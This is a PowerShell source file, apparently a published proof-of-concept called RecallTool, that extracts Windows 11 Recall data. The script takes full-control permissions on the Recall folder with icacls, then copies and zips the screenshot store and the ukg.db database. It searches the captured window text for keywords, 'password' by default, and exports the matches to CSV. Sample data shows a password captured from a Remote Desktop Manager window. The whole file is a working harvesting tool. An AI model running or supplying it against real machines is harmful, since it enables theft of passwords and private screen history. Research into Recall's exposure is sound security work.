#
#  ________  _______   ________  ________  ___       ___               _________  ________  ________  ___          
# |\   __  \|\  ___ \ |\   ____\|\   __  \|\  \     |\  \             |\___   ___\\   __  \|\   __  \|\  \         
# \ \  \|\  \ \   __/|\ \  \___|\ \  \|\  \ \  \    \ \  \            \|___ \  \_\ \  \|\  \ \  \|\  \ \  \        
#  \ \   _  _\ \  \_|/_\ \  \    \ \   __  \ \  \    \ \  \                \ \  \ \ \  \\\  \ \  \\\  \ \  \       
#   \ \  \\  \\ \  \_|\ \ \  \____\ \  \ \  \ \  \____\ \  \____            \ \  \ \ \  \\\  \ \  \\\  \ \  \____  
#    \ \__\\ _\\ \_______\ \_______\ \__\ \__\ \_______\ \_______\           \ \__\ \ \_______\ \_______\ \_______\
#     \|__|\|__|\|_______|\|_______|\|__|\|__|\|_______|\|_______|            \|__|  \|_______|\|_______|\|_______|
#
#                    Recall Tool PowerShell Script | https://github.com/d3vh4ck/RecallTool
#          Proof of concept script to access and extract Windows 11 Recall data written in PowerShell.
#
# Dependencies:
#     The SQLite DLLs System.Data.SQLite.dll and SQLite.Interop.dll must be in the same directory as this script.
#
# Command-line arguments
#    $recallpath - path to the Recall database file
#    $search - keyword to search in the Recall database
#    $exportpath - path to export all data
#    $createdb - create database tables and populate test data
#
#    Example commane-lines:
#            .\RecallTool.ps1 -search Mypassword01
#            .\RecallTool.ps1 -recallpath c:\Users\MyUser\Desktop\recall -search Mypassword01 -exportpath c:\Users\MyUser\Desktop\export
#            .\RecallTool.ps1 -createdb yes
#
param ($recallpath='', $search='password', $exportpath='', $createdb='')

# Script version
$version = "1.0.0"

# Global variables
$global:currentPath = split-path -parent $MyInvocation.MyCommand.Definition
$global:wctResults = [System.Collections.ArrayList]@()
$global:itResults = [System.Collections.ArrayList]@()

# Script exit function
function Exit-Script
{
	Param
	(
		[Parameter(Mandatory=$true, Position=0)]
		[string] $error
    )

	Write-Host "Fatal Error: $error" -ForegroundColor Red
	Exit
}

# Script banner
Write-Host "
  ________  _______   ________  ________  ___       ___               _________  ________  ________  ___          
 |\   __  \|\  ___ \ |\   ____\|\   __  \|\  \     |\  \             |\___   ___\\   __  \|\   __  \|\  \         
 \ \  \|\  \ \   __/|\ \  \___|\ \  \|\  \ \  \    \ \  \            \|___ \  \_\ \  \|\  \ \  \|\  \ \  \        
  \ \   _  _\ \  \_|/_\ \  \    \ \   __  \ \  \    \ \  \                \ \  \ \ \  \\\  \ \  \\\  \ \  \       
   \ \  \\  \\ \  \_|\ \ \  \____\ \  \ \  \ \  \____\ \  \____            \ \  \ \ \  \\\  \ \  \\\  \ \  \____  
    \ \__\\ _\\ \_______\ \_______\ \__\ \__\ \_______\ \_______\           \ \__\ \ \_______\ \_______\ \_______\
     \|__|\|__|\|_______|\|_______|\|__|\|__|\|_______|\|_______|            \|__|  \|_______|\|_______|\|_______|

             Recall Tool PowerShell Script Version $version | https://github.com/d3vh4ck/RecallTool
           Proof of concept script to access and extract Windows 11 Recall data written in PowerShell.
"

# SQLite DLL filename and path (current/script path)
$sqliteFilename = "System.Data.SQLite.dll"
$sqlitePath = "$global:currentPath\$sqliteFilename"

# Verify the SQLite DLL exists
if (!(Test-Path -Path $sqlitePath))
{
	Exit-Script("SQLite DLL not found ($global:currentPath\$sqliteFilename).")
}

# Load the SQLite DLL
$loadSQLite = [Reflection.Assembly]::LoadFile($sqlitePath)

# Display search query (either default or user-defined)
Write-Host "Search query: $search"

# Set the export path
if ($exportpath -eq '')
{
	$exportPath = -join($global:currentPath, '\recall-tool')
} else {
	$exportPath = $exportpath
}
Write-Host "Export directory: $exportPath"
Write-Host ""

# If user specifies recallpath use that path, otherwise use the default Recall path
if ($recallpath -ne '')
{
	$rPath = $recallpath
	$dbPath = -join($recallpath, '\ukg.db')
	$isPath = -join($recallpath, '\ImageStore')
} else {
	# The full path to the ukg.db file
	$ukpPath = -join($env:LOCALAPPDATA, '\CoreAIPlatform.00\UKP')

	# Verify the Recall path exists
	if (!(Test-Path -Path $ukpPath))
	{
		Exit-Script("Recall not detected on this system!")
	}
	Write-Host "Recall detected on this system!" -ForegroundColor Green

	# Change the permissions to Recall directory and files so the current user can access if not an administrator or SYSTEM user
	try
	{
		$null = Invoke-Expression -Command:"icacls $ukpPath /grant ${Env:UserName}:'(OI)(CI)F' /t /c /q"
		Write-Host "Successfully changed the permissions for Recall directories and files." -ForegroundColor Green
	} catch {
		Write-Host "Failed to change the permissions for Recall directories and files. Continuing..." -ForegroundColor Red
	}

	Write-Host ""

	try
	{
		$uuid = Get-ChildItem $ukpPath -Name
		$rPath = -join($ukpPath, '\', $uuid)
	} catch {
		Exit-Script("Unable to find Recall UUID directory.")
	}

	$dbPath = -join($rPath, '\ukg.db')
	$isPath = -join($rPath, '\ImageStore')
}

# Verify the recall/UUID directory, ukg.db file and ImageStore directory exists
if (!(Test-Path -Path $rPath))
{
	Exit-Script("Recall/UUID directory not found: $rPath")
}
Write-Host "Recall directory found: $rPath" -ForegroundColor Green

# Verify the Recall database exists
if (!(Test-Path -Path $dbPath))
{
	Exit-Script("Database file not found: $dbPath")
}
Write-Host "Recall database found: $dbPath" -ForegroundColor Green

# Verify the ImageStore directory exists
if (!(Test-Path -Path $isPath))
{
	Exit-Script("ImageStore directory not found: $isPath")
}
Write-Host "Recall ImageStore directory found: $isPath" -ForegroundColor Green
Write-Host ""

# Check to see if the export directory exists
if (Test-Path -Path $exportPath)
{
	Write-Host "Export directory already exists: $exportPath" -ForegroundColor Yellow
} else {
	$result = New-Item $exportPath -Type Directory
	if (!$result)
	{
		Exit-Script("Unable to create export path.")
	}
	Write-Host "Export directory created: $exportPath" -ForegroundColor Green
}

# Create temp working directory
$tempPath = -join($exportPath, '\temp')
$tempIsPath = -join($tempPath, '\ImageStore')

if (Test-Path -Path $tempPath)
{
	Write-Host "Temp directory already exists: $tempPath" -ForegroundColor Yellow
} else {
	try
	{
		$result = New-Item $tempPath -Type Directory
		Write-Host "Temp directory created: $tempPath" -ForegroundColor Green
	} catch {
		Exit-Script("Unable to create temp directory")
	}
}

# Verify the export directory exists
if (!(Test-Path -Path $exportPath))
{
	Exit-Script("The export directory was not found.")
}

# Verify the temp directory exists
if (!(Test-Path -Path $tempPath))
{
	Exit-Script("The temp directory was not found.")
}

Write-Host ""

# Copy Recall files to export temp directory
Write-Host "Copying Recall files to export directory..." -NoNewline
$destPath = -join($rPath, '\*')
try
{
	Copy-Item -Path $destPath -Destination $tempPath -Recurse
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to copy Recall files to temp directory.")
}

# Verify the ImageStore directory exists in the temp directory
if (!(Test-Path -Path $tempIsPath))
{
	Exit-Script("The temp ImageStore directory was not found.")
}

# Rename ImageStore image files before compressing them
$images = (Get-ChildItem -Path $tempIsPath -File -Name)
$imageCount = $images.Count
Write-Host "Adding .jpg file extension to temp directory ImageStore files ($imageCount files)..." -NoNewline
try
{
	foreach ($image in $images)
	{
		$oldName = -join($tempIsPath, '\', $image)
		$newName = -join($tempIsPath, '\', $image, '.jpg')
		Rename-Item -Path $oldName -NewName $newName
	}
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to rename temp directory ImageStore images.")
}

# Show warning if no images are in the ImageStore directory
if (((Get-ChildItem $isPath | Measure-Object).Count) -eq 0)
{
	Write-Host "No ImageStore images found to compress. The ImageStore directory and images will NOT be in the ZIP archive." -ForegroundColor Yellow	
}

# Compress the exported Recall data into a zip file
$zipPath = -join($exportPath, '\recall_export.zip')
Write-Host "Compressing Recall data ($zipPath)..." -NoNewline
try
{
	$compress = @{
		Path = -join($tempPath, '\*')
		CompressionLevel = "Optimal"
		DestinationPath = $zipPath
	}
	Compress-Archive @compress
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Error while compressing Recall data.")
}

Write-Host ""

# Connect to the Recall SQLite database
try {
	$connString = "Data Source=$dbPath"
	$conn = New-Object System.Data.SQLite.SQLiteConnection
	$conn.ConnectionString = $connString
	$conn.Open()
	Write-Host "Connected to Recall database successfully." -ForegroundColor Green
} catch {
		Exit-Script("Failed to connect to Recall database.")
}

# Create tables and insert data if requested
if ($createdb -eq 'yes')
{
	Write-Host "Request has been made to create sample database tables and data."
	Write-Host "Creating database tables..." -NoNewline

	# Create database tables
	try
	{
		$command=$conn.CreateCommand()
		$command.CommandText="
		CREATE TABLE WindowCaptureTextIndex_content (
			id INTEGER PRIMARY KEY AUTOINCREMENT
						UNIQUE
						NOT NULL,
			c0 INTEGER NOT NULL
						UNIQUE,
			c1 TEXT,
			c2 TEXT
		)"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="
		CREATE TABLE WindowCapture (
			id INTEGER PRIMARY KEY AUTOINCREMENT
						UNIQUE
						NOT NULL,
			WindowTitle TEXT,
			TimeStamp TEXT,
			ImageToken TEXT
		)"
		$null = $command.ExecuteNonQuery()
		
		Write-Host "Done." -ForegroundColor Green
	} catch {
		Write-Host ""
		Exit-Script("Unable to create database tables.")
	}

	Write-Host "Inserting data into tables..." -NoNewline

	try
	{
		# Insert WindowCaptureTextIndex_content test data
		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1, c2) VALUES (1, 'Notepad', 'test')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (4, '*Untitled - Notepad')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (6, 'Task Manager')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (16, 'Notepad')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (18, 'Task Manager')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (22, 'Quick Settings')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (29, 'Settings')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (41, 'Chrome')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="
		INSERT INTO WindowCaptureTextIndex_content (
			c0,
			c1,
			c2
		)
		VALUES (
			42,
			'Remote Desktop Manager',
			'Remote Desktop Manager - View the Current Password [user] X View the Current Password user Username user Password Mypassword01! Mask the password Show Password hints Close'
		)"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (50, 'Edge')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCaptureTextIndex_content (c0, c1) VALUES (54, 'Settings')"
		$null = $command.ExecuteNonQuery()
		
		# Insert WindowCapture test data
		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Task Manager', '1717777141', 'ImageToken_123456789')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Notepad', '1717777141', 'ImageToken_543095194')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Remote Desktop Manager', '1717777141', 'ImageToken_840185032')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Chrome', '1717777141', 'ImageToken_857194058')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Settings', '1717777141', 'ImageToken_847295016')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('Edge', '1717777141', 'ImageToken_746291058')"
		$null = $command.ExecuteNonQuery()

		$command=$conn.CreateCommand()
		$command.CommandText="INSERT INTO WindowCapture (WindowTitle, TimeStamp, ImageToken) VALUES ('*Untitled - Notepad', '1717777141', 'ImageToken_893827596')"
		$null = $command.ExecuteNonQuery()

		Write-Host "Done." -ForegroundColor Green
	} catch {
		Write-Host ""
		Exit-Script("Unable to insert data into tables.")
	}

	Write-Host ""
}

# Get the WindowCaptureTextIndex_content data from the database
Write-Host "Reading WindowCaptureTextIndex_content data from the database..." -NoNewline
try
{
	# Query the WindowCaptureTextIndex_content table for the specified keyword
	$query = "SELECT * FROM WindowCaptureTextIndex_content WHERE c1 LIKE '%$search%' OR c2 LIKE '%$search%'"
	$command=$conn.CreateCommand()
	$command.Commandtext = $query
	$command.CommandType = [System.Data.CommandType]::Text
	$reader=$command.ExecuteReader()

	# Parse Recall database WindowCaptureTextIndex_content results
	while($reader.HasRows)
	{
		if($reader.Read())
		{
			$null = $global:wctResults.Add(-join('"', $reader["id"], '","', $reader["c0"], '","', $reader["c1"], '","', $reader["c2"], '"'))
		}
	}
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to extract WindowCaptureTextIndex_content data.")
}

# Disaply the number of rows returned from the SQL query
$resultsCount = $global:wctResults.Count
Write-Host "Number of rows returned from SQL query: $resultsCount"

# Add WindowCaptureTextIndex_content data to the $wctCsv array
$wctCsv = [System.Collections.ArrayList]@()
$null = $wctCsv.Add('"id","c0","c1","c2"')
$null = $wctCsv.Add($global:wctResults)

# Get the WindowCapture data from the database
Write-Host "Reading WindowCapture data from the database..." -NoNewline
try
{
	# Query the WindowCapture table
	$query = "SELECT WindowTitle, TimeStamp, ImageToken FROM WindowCapture"
	$command=$conn.CreateCommand()
	$command.Commandtext = $query
	$command.CommandType = [System.Data.CommandType]::Text
	$reader=$command.ExecuteReader()

	# Parse Recall database WindowCaptureTextIndex_content results
	while($reader.HasRows)
	{
		if($reader.Read())
		{
			$null = $global:itResults.Add(-join('"', $reader["WindowTitle"], '","', $reader["TimeStamp"], '","', $reader["ImageToken"], '"'))
		}
	}
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to extract WindowCapture data.")
}

# Add WindowCapture data to the $wcCsv array
$wcCsv = [System.Collections.ArrayList]@()
$null = $wcCsv.Add('"WindowTitle","TimeStamp","ImageToken"')
$null = $wcCsv.Add($global:itResults)

$conn.Close() # Close database connection
Write-Host "Database connection closed." -ForegroundColor Green
Write-Host ""

# Create WindowCaptureTextIndex_content.csv
$wctCsvPath = -join($exportPath, '\WindowCaptureTextIndex_content.csv')
Write-Host "Writing WindowCaptureTextIndex_content.csv file ($wctCsvPath)..." -NoNewline
try
{
	$wctCsv | Out-File -Append $wctCsvPath
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to create WindowCaptureTextIndex_content.csv file.")
}

# Create WindowCapture.csv
$wcCsvPath = -join($exportPath, '\WindowCapture.csv')
try
{
	Write-Host "Writing WindowCapture.csv file ($wcCsvPath)..." -NoNewline
	$wcCsv | Out-File -Append $wcCsvPath
	Write-Host "Done." -ForegroundColor Green
} catch {
	Write-Host ""
	Exit-Script("Unable to create WindowCapture.csv file.")
}

Write-Host ""

# Delete the temp directory
Write-Host "Deleting the temp directory..." -NoNewline
Remove-Item -Recurse -Force $tempPath
Write-Host "Done." -ForegroundColor Green

Exit
